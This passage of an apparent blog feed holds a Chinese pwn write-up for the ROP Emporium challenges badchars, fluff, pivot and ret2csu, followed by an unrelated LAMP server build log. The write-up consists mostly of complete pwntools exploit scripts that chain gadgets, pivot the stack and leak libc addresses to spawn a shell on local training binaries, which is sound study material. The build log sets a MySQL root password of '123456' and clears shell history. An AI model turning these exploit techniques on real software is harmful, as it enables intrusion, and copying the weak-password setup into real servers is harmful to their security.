elf.search(&#39;/bin/cat&#39;).next()offset = 40bss = 0x601090-0x10key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; retkey2 = 0x0000000000400890# pop r14 ; pop r15 ; retkey3 = 0x0000000000400893#pop rdi ; retsystem = 0x000004005E0payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\x00&#39;,key1,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题目跟前一个write4十分的相似，但是其过滤了个别字符：<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>会将其替换为<code>0xEB</code>，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造<code>system(sh)</code>来拿的shell。<br>例子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>传过去的是<code>sh\x00\x00\x00\x00\x00\x00\x00</code> 到bss是这个情况，然后去找xor的gadget：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。<br>这个题目在gdb调试exp时会发现有比较便捷的办法。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-3"><a href="#32位：-3" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./badchars32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars32&#39;)key1 = 0x08048893# mov dword ptr [edi], esi ; retkey2 = 0x08048899# pop esi ; pop edi ; retkey3 = 0x08048461# pop ebx ; retbss = 0x804A06C-10key4 = 0x08048897# pop ecx ; retkey5 = 0x08048890#xor byte ptr [ebx], cl ; retsys = 0x080484E0offset = 44payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-3"><a href="#64位：-3" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./badchars&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars&#39;)offset = 40bss = 0x6010B0key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; retkey2 = 0x0000000000400b3b# pop r12 ; pop r13 ; retkey3 = 0x0000000000400b39#pop rdi ; retkey4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; retkey5 = 0x0000000000400b40#pop r14 ; pop r15 ; retsystem = 0x004006F0payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00\x00\x00\x00\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在：</p><pre><code>mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。<br>其中64位的找可用gadget，还需要控制一下深度：</p><pre><code>ROPgadget --binary ./fluff --depth 15 </code></pre><p>这样找出足够的gadget，以便自己试用。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-4"><a href="#32位：-4" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./fluff32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff32&#39;)key1 = 0x080483e1# pop ebx ; retkey2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retkey3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retbss = 0x804A06Ckey4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retkey5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; retsys = 0x8048430offset = 44payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\x00\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-4"><a href="#64位：-4" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./fluff&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff&#39;)key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; retkey2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retkey3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retbss = 0x601090key4 = 0x0000000000400840##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retkey5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retkey6 = 0x00000000004008c3# pop rdi ; retsys = 0x4005E0offset = 40payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>这个题一看就是栈转移了。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>可以看到会给你泄漏一个堆地址，给你去栈转移。<br>接着看后门函数，发现这里call一个与libc连接的函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>接着分析一下给定的so文件：<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><pre><code class="c">void __noreturn ret2win(){  system(&quot;/bin/cat flag.txt&quot;);  exit(0);}</code></pre><p>接着就有思路了，栈转移到给你的堆地址上，然后构造rop链：</p><ul><li>leak <code>foothold_function_got</code></li><li>算出给的libc基址，回到start，再次利用漏洞</li><li>构造jmp到ret2win的链即可<br>但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。</li></ul><p>根据给的堆地址和so文件映射基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32位：-5"><a href="#32位：-5" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)libc = ELF(&#39;./libpivot32.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x080486a8 #: leave ; retio.recvuntil(&#39;0x&#39;)leak = int(io.recv(8),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = u32(io.recv(4))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)payload = &#39;a&#39; * 44 + p32(ret2win)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-5"><a href="#64位：-5" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x0000000000400a39 #: leave ; retkey2 = 0x0000000000400b73#pop rdi ; retkey3 = 0x0000000000400b02#xchg rax, rsp ; retkey4 = 0x0000000000400b00#pop rax ; retprint(&#39;offset:&#39; + hex(offset))io.recvuntil(&#39;0x&#39;)leak = int(io.recv(12),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = int(u64(io.recv(6).ljust(8,&#39;\x00&#39;)))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]print(&#39;ret2win&#39;+ hex(ret2win))# raw_input(&#39;-&gt;&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(ret2win)io.sendline(payload)io.interactive()</code></pre><p>这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现<code>leave ret</code>的这个gadget，地址都是有<code>0x0a</code>,所以只能更换gadget，来伪造栈。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32位：-6"><a href="#32位：-6" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)offset = 44io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(8),16) + 1921272 + 0x000000967print(&#39;leak&#39;+ hex(leak1))raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p32(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-6"><a href="#64位：-6" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)offset = 40io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;]raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p64(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为<code>0xdeadcafebabebeef</code> 就可以了。但是比较难搞的一点是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为<code>call 0xaaaaa</code> 汇编作用：</p><ul><li>push PC（也就是该汇编指令的下一个汇编指令的地址）</li><li><code>jmp [0xaaaaa]</code> 是该函数point指向的地址</li></ul><p>这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>但是会发现上面还有一个动态链接<code>_DYNAMIC</code>的信息，跟进去：<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>发现一堆初始化用的函数。然后点进去第一个可以看看：<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着<code>0x400560</code>，毫无疑问肯定是这个<code>_DYNAMIC</code>里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>发现应该是<code>0x0600E38</code>。接下来的就简单了，传统的ret2csu。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./ret2csu&#39;)elf = ELF(&#39;./ret2csu&#39;)offset = 40io.recvuntil(&#39;&gt;&#39;)key1 = 0x040089Akey2 = 0x000400880key3 = 0x0000600E38raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1])io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- Lamp搭建记录</title>
    <link href="/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Lamp搭建记录"><a href="#Lamp搭建记录" class="headerlink" title="Lamp搭建记录"></a>Lamp搭建记录</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装编译环境："><a href="#安装编译环境：" class="headerlink" title="安装编译环境："></a>安装编译环境：</h3><pre><code>yum -y install gcc*</code></pre><p>安装好后记得关闭防火墙和selinux</p><h3 id="准备软件包"><a href="#准备软件包" class="headerlink" title="准备软件包"></a>准备软件包</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>把这些安装包都放入虚拟机自定义的路径，等待使用。</p><h3 id="shell脚本批量解包"><a href="#shell脚本批量解包" class="headerlink" title="shell脚本批量解包"></a>shell脚本批量解包</h3><pre><code class="bash">#!/bin/bash/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.listfor a in `cat ls.list`do        /bin/tar -zxf $adonerm -rf ls.list</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>然后开始一一的装包，注意需要按照一定的顺序来装的。</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><pre><code class="bash">yum -y install python-devel</code></pre><p>安装python的底层环境。</p><pre><code class="bash">[root@localhost lamp1]# cd libxml2-2.9.1/[root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/[root@localhost libxml2-2.9.1]# make[root@localhost libxml2-2.9.1]# make install</code></pre><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>提供一些加密算法：</p><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/[root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/[root@localhost libmcrypt-2.5.8]# make[root@localhost libmcrypt-2.5.8]# make install</code></pre><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/[root@localhost libltdl]# ./configure --enable-ltdl-install[root@localhost libltdl]# make[root@localhost libltdl]# make install</code></pre><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>提供加密方式的扩展</p><pre><code class="bash">[root@localhost lamp1]# cd mhash-0.9.9.9/[root@localhost mhash-0.9.9.9]# ./configure</code></pre><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>提供php相关的加密支持拓展库</p><pre><code class="bash">[root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt[root@localhost mcrypt-2.6.8]# make[root@localhost mcrypt-2.6.8]# make install</code></pre><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>提供压缩用途的函数库</p><pre><code class="bash">[roott@localhost lamp1]# cd zlib-1.2.3/[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install</code></pre><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><pre><code class="bash">[root@localhost zlib-1.2.3]# cd ../[root@localhost lamp1]# cd libpng-1.2.31/[root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng[root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install</code></pre><p>如果出现：</p><pre><code class="bash">/usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata&#39; can not be used when making a shared object; recompile with -fPIC</code></pre><p>解决办法 ： </p><pre><code class="bash">[root@localhost lamp1]# cd zlib-1.2.3 //进入zlib目录[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# CFLAGS=&quot;-O3 -fPIC&quot; ./configure   --prefix=/usr/local/zlib/ #使用64位元的方法进行编译[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install[root@localhost zlib-1.2.3]# make clean</code></pre><p>然后在重新来安装libpng即可。</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>提供jpeg格式的图片</p><pre><code class="bash">[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include[root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1</code></pre><pre><code class="bash">root@localhost lamp]# cd jpeg-6b/[root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</code></pre><p>如果发生这样的报错：</p><pre><code class="bash">[root@localhost jpeg-6b]# make./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtool：命令未找到make: *** [jcapimin.lo] 错误 127</code></pre><p>需要：</p><pre><code class="bash">[root@localhost jpeg-6b]# yum -y install libtool[root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess .cp：是否覆盖&quot;./config.guess&quot;？ yes[root@localhost jpeg-6b]# make clean</code></pre><p>重新再来就好。</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>字体库。</p><pre><code class="bash">[root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype</code></pre><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>给php提供图形拓展的库</p><pre><code class="bash">[root@localhost lamp]# mkdir /usr/local/gd2[root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/[root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</code></pre><p>这样会爆一个错，然后需要改一下源码：</p><pre><code class="bash">[root@localhost gd-2.0.35]# vim gd_png.c</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>需要指定一下路径即可，这个刚刚是已经安装过的。</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>先装两个工具包：</p><pre><code>cp -r apr-1.4.6 httpd-2.4.7/srclib/aprcp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util</code></pre><h3 id="开始装httped："><a href="#开始装httped：" class="headerlink" title="开始装httped："></a>开始装httped：</h3><p>先进入装一下pcre：</p><pre><code>./configuremakemake install</code></pre><p>进入httped：<br>先对配置进行设置：</p><pre><code>./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=sharedmakemake install</code></pre><h3 id="开服务："><a href="#开服务：" class="headerlink" title="开服务："></a>开服务：</h3><pre><code>/usr/local/apache2/bin/apachectl start</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>设置开机时自动启动这个服务。</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h3><p>装两个工具：</p><pre><code>[root@localhost local]# yum -y install cmake[root@localhost local]# yum -y install bison[root@localhost local]# yum -y install ncurses-devel</code></pre><p>建立一个用户：</p><pre><code>[root@localhost local]# useradd mysql[root@localhost local]# id mysqluid=1001(mysql) gid=1001(mysql) 组=1001(mysql)</code></pre><p>安装ncurses：</p><pre><code>[root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite[root@localhost ncurses-5.9]# make[root@localhost ncurses-5.9]# make install</code></pre><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \&gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \&gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \&gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \&gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \&gt; -DMYSQL_TCP_PORT=3306</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost  mysql-5.5.23]# make[root@localhost  mysql-5.5.23]# make install</code></pre><h3 id="简单设置"><a href="#简单设置" class="headerlink" title="简单设置"></a>简单设置</h3><p>初始化mysql：</p><pre><code>[root@localhost mysql]# chown -R mysql:mysql .[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>设置权限：</p><pre><code>[root@localhost mysql]# chown -R root .[root@localhost mysql]# chown -R mysql data/</code></pre><p>覆盖一下配置文件：</p><pre><code>[root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnfcp：是否覆盖&quot;/etc/my.cnf&quot;？ yes</code></pre><p>接着初始化：</p><pre><code>[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql200408 03:38:45 mysqld_safe Logging to &#39;/usr/local/mysql/data/localhost.localdomain.err&#39;.200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p>发现卡死了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# ps aux | grep mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# kill -9 102872[root@localhost mysql-5.5.23]# ps aux | grep mysqlmysql    103111  0.0  4.9 727288 49260 pts/3    Sl   03:39   0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306root     103201  0.0  0.0 112728   972 pts/2    S+   03:46   0:00 grep --color=auto mysql</code></pre><p>杀掉重新来。<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>成功了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="设置mysql密码"><a href="#设置mysql密码" class="headerlink" title="设置mysql密码"></a>设置mysql密码</h3><pre><code>[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password &quot;123456&quot;[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>成功了。注意 <code>history -c</code> 清楚历史记录命令。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>服务都正常，字符集格式也在。</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="准备工作-2"><a href="#准备工作-2" class="headerlink" title="准备工作"></a>准备工作</h3><pre><code>[root@localhost mysql]# yum -y install libtool*[root@localhost local]# yum -y install libpng-devel</code></pre><p>让php支持数据库的内容：</p><pre><code>[root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="开始安装-1"><a href="#开始安装-1" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make install</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><pre><code>[root@localhost php-5.4.25]# mkdir /usr/local/php/etc[root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre><p>复制主配置文件到<code>/usr/local/php/etc</code></p><pre><code>[root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" 